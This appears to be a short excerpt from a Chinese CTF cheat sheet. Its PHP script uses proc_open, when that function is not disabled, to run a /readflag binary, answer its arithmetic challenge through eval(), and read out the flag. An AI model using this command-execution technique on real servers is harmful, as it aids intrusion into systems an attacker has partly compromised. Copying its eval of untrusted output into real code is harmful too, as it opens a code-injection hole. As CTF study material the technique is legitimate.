###	Proc_open

在 proc_open 没有被 ban 的情况下：

```php
<?php 
error_reporting(E_ALL);
echo "1";
$descriptorspec = array(
   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
   2 => array("pipe", "r") // 标准错误，写入到一个文件
);

$file=array();

$process = proc_open("/readflag 2>&1", $descriptorspec, $file);

var_dump($process);
var_dump($file);

function readln($file){
    $out = "";
    $a = fread($file, 1);
    echo "readln";
    while ($a != "\n") {
        $out = $out.$a;
        $a = fread($file, 1);
    }
    return $out;
}

$data=readln($file[1]);
var_dump($data);

$data=readln($file[1]);
var_dump($data);
$ans = "".eval("return ".$data.";")."\n";
echo "ans";
var_dump($ans);
fputs($file[0], $ans);
$data=readln($file[1]);
echo $data;
$data=readln($file[1]);
echo $data;
$data=readln($file[1]);
echo $data;
?>
```

